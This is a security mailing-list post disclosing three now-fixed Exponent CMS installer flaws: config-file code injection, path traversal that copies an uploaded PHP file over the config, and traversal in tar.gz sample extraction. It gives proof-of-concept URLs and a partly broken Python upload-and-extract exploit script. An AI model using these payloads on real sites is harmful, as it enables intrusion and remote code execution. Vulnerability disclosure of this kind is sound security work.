Arbitrary code execution ``` lines 56 - 63 if (isset($_REQUEST['sc'])) {     if (file_exists("../framework/conf/config.php")) {         // Update the config         foreach ($_REQUEST['sc'] as $key => $value) { //            $value = expString::sanitize($value);             expSettings::change($key, $value);         }     } ``` The function of the expSettings::change() is to modify the config file("framework/conf/config.php"), but there is failed to filter user input lead to we could write anything to config file.  Proof of concept: http://www.exponentcms.org/install/index.php?sc[SMTP_PORT]=25\\');phpinfo();//   phpinfo() will be executed. Tips: Visit " http://www.exponentcms.org/install/index.php?sc[SMTP_PORT]=25 " can be recovery it.   2. RCE vulnerability ``` if (isset($_REQUEST['profile'])) {     expSettings::activateProfile($_REQUEST['profile']); //here     expTheme::removeSmartyCache(); //FIXME is this still necessary?     expSession::clearAllUsersSessionCache();     flash('message', gt("New Configuration Profile Loaded"));     header('Location: ../index.php'); } ``` expSettings::activateProfile() : ``` copy(BASE . "framework/conf/profiles/$profile.php", BASE . "framework/conf/config.php"); //here // tag it with the profile name $fh = fopen(BASE . "framework/conf/config.php", "a"); ``` We can upload a "php" file to website, then copy it to "framework/conf/config.php"  Proof of concept: first, We first upload a "php" to website (by “uploader_paste.php”), such as /files/test.php then visit http://www.exponentcms.org/install/index.php?profile=../../../files/test, then will copy "/files/test.php" to "framework/conf/config.php".   3. File Upload vulnerability ``` $files = BASE . "themes/" . DISPLAY_THEME_REAL . "/" . $_REQUEST['install_sample'] . ".tar.gz"; if (!file_exists($files)) {     $files = BASE . "install/samples/" . $_REQUEST['install_sample'] . ".tar.gz"; //here } if (file_exists($files)) { // only install if there was an archive     include_once(BASE . 'external/Tar.php');     $tar = new Archive_Tar($files); //Extract .tar.gz file     $return = $tar->extract(BASE); } ``` The function of those code is extract .tar.gz file, but through "install_sample", the parameter of "$files" is what we can control, so we could upload a .tar.gz evil file, then extract it.  Proof of concept: first, upload .eql and .tar.gz files(by “uploader_paste.php”),such as /files/10.tar.gz then visit http://www.exponentcms.org/install/index.php?install_sample=../../files/10 Successfully extract file:  http://www.exponentcms.org/3.php  python poc code: ``` import random import requests host = 'http://www.exponentcms.org/'  def upload(name, url): files = {'upload' : (name, open('evil.tar.gz'))} resp = requests.post(url, files=files) return resp.content  if 'http://' not in host: host = 'http://{}'.format(host)  host = host.rstrip('/') url = '{}/framework/modules/file/connector/uploader_paste.php'.format(host) rstr =  req_eql = upload('{}.eql'.format(rstr), url) req_tar = upload('{}.tar.gz'.format(rstr), url)  if 'tar.gz' in req_tar: req_inc = requests.get('{}/install/index.php?install_sample=../../files/{}'.format(host, rstr))  evilfile = '{}/3.php'.format(host) req_ = requests.get(evilfile)  if 'GIF89a' in req_.content: print evil-file ```  And now, all vulnerabilities have been fixed.   these issues was reported by Peng Hua of silence.com.cn Inc. and I would like to request  CVEs for these issues (if not done so).   -------------------http://www.silence.com.cn/ penghua@...ence.com.cn PKAV Team   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.
